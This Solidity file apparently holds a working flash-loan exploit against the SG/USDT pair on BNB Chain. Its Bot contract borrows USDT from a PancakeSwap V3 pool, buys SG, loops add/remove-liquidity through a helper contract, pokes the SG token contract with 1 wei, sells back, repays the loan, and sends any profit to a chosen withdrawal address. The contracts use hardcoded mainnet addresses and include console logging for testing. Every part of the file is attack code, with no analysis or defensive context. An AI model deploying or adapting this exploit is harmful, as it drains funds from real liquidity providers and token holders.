//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

contract Bot2 {
    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant USDT_SG_PAIR = IUniswapV2Pair(0x65A9c67EABE166a2D08fC8035435DcF31b5ae41A);

    function removeLiquidity(address liquidityProvider) public {
        USDT_SG_PAIR.approve(address(UNISWAP_ROUTER), type(uint256).max);
        UNISWAP_ROUTER.removeLiquidity(
            address(USDT_SG_PAIR.token0()),
            address(USDT_SG_PAIR.token1()),
            USDT_SG_PAIR.balanceOf(address(this)),
            0,
            0,
            liquidityProvider,
            block.timestamp
        );
    }
}

contract Bot is Ownable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions private constant USDT_WBNB_POOL =
        IUniswapV3PoolActions(0x36696169C63e42cd08ce11f5deeBbCeBae652050);

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant USDT_SG_PAIR = IUniswapV2Pair(0x65A9c67EABE166a2D08fC8035435DcF31b5ae41A);

    ERC20 private constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 private constant SG = ERC20(0xa28dB960e32833f582bA5F6338880bf239f2a966);

    address private constant _backLpReleaseDistributor = 0x89BF7647Dd7b1C8B20aa52E0eC6d28190f2314c2;

    constructor() Ownable(msg.sender) {}

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        (uint256 borrowAmount, uint256 swapAmount, uint256 loopCount) = abi.decode(data, (uint256, uint256, uint256));

        console.log("Before buy");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", SG.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(address(USDT), address(SG), swapAmount, address(this));

        console.log("After buy");
        console.log("Before addLiquidity");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", SG.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", SG.balanceOf(address(this)) / 1 ether);
        console.log();

        Bot2 bot2 = new Bot2();

        for (uint256 i = 0; i < loopCount; i++) {
            UNISWAP_ROUTER.addLiquidity(
                address(USDT),
                address(SG),
                USDT.balanceOf(address(this)),
                SG.balanceOf(address(this)),
                0,
                0,
                address(bot2),
                block.timestamp
            );

            bot2.removeLiquidity(address(this));
        }

        console.log("After removeLiquidity");
        console.log("Before sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", SG.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", SG.balanceOf(address(this)) / 1 ether);
        console.log();

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(SG), address(USDT), SG.balanceOf(address(this)), address(this)
        );

        console.log("After sell");
        console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Pool MIN balance =>", SG.balanceOf(address(USDT_SG_PAIR)) / 1 ether);
        console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        console.log("Bot MIN balance =>", SG.balanceOf(address(this)) / 1 ether);
        console.log();

        USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    function main(
        address thisAddress,
        uint256 flashLoanAmount,
        uint256 swapAmount,
        uint256 loopCount,
        address withdrawAddress
    ) public {
        uint256 beforeBalance = USDT.balanceOf(address(this));

        flashLoanAmount = flashLoanAmount * 1 ether;
        swapAmount = swapAmount * 1 ether;

        bytes memory params = abi.encode(flashLoanAmount, swapAmount, loopCount);

        USDT_WBNB_POOL.flash(address(thisAddress), flashLoanAmount, 0, params);

        address(SG).call{value: 1}("");

        swapExactTokensForTokensSupportingFeeOnTransferTokens(
            address(SG), address(USDT), SG.balanceOf(address(this)), address(this)
        );

        uint256 afterBalance = USDT.balanceOf(address(this));

        require(afterBalance > beforeBalance, "No profit");

        USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

        console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
        console.log();
    }
}
